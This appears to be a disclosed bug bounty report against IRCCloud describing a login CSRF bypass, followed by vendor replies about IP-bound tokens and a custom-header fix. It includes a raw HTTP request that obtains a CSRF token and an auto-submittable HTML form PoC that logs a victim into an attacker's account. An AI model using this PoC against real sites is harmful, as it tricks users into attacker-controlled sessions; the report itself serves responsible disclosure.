title: Login CSRF can be bypassed (Similar approach to previous one).

profile.name: IRCCloud
profile.about: Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message.

vulnerability_information:
The login CSRF protection currently implemented is not adequate and can be bypassed pretty easily.

An attacker can easily obtain a CSRF token from the server by initiating the following request:

POST /chat/auth-formtoken HTTP/1.1
Host: www.irccloud.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.irccloud.com/
Content-Length: 8
Cookie: session=
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

_reqid=1

Once this request is sent an attacker would receive a valid CSRF token. In my case I received "1397481736.3b1f59ae47e1a139e8a631b2589dfae2"

Once I have a valid CSRF token, I can conduct a login CSRF attack against a victim using the following PoC. Notice the CSRF token is the one received above.

<html>
  <body>
    <form action="https://www.irccloud.com/chat/login" method="POST">
      <input type="hidden" name="email" value="ATTACKER-EMAIL" />
      <input type="hidden" name="password" value="ATTACKER-PASSWORD" />
      <input type="hidden" name="org_invite" value="" />
      <input type="hidden" name="token" value="1397481736.3b1f59ae47e1a139e8a631b2589dfae2" />
      <input type="hidden" name="_reqid" value="2" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

This has basically defeated the CSRF protection offered by the application. When a victim submits the above request, the victim would be logged into the attackers account.

activities.message: The token is tied to the IP it was issued to. You wouldn't be able to use the token from a different IP, so the attacker would need the victim's machine to request the token.

Ah fair enough which is why it works locally. Don't think it's the best option though. In an organisation everyone would be sharing the same public NAT IP address.

It should be tied to a user's session ID.

activities.message: Reopening this bug as we are planning to resolve this case by requiring a custom header on login, signup and password reset request. We will send this via XHR request, which a cross-site form request will be unable to do.

Yup that's a far better approach with a random token per session as the value in the custom header.

Some old vulnerable flash versions are able to set custom headers.

Cheers,

activities.message:
Old vulnerable versions could. I don't think that technique works anymore.
 
Here is some more information about the vulnerability:

http://security.stackexchange.com/questions/23371/csrf-protection-with-custom-headers-and-without-validating-token

http://michael-coates.blogspot.com.au/2010/05/csrf-attacks-and-forged-headers.html

It's always best to secure it with random tokens per session coz if a vulnerability is found (like the Flash bug) that allows someone to set custom-headers, you application would be vulnerable.

Once it's disclosed, a lot of new testers will just copy and report the bug  to other teams/organisers without really putting any research effort or time - in hopes of making a quick buck.

Cheers,
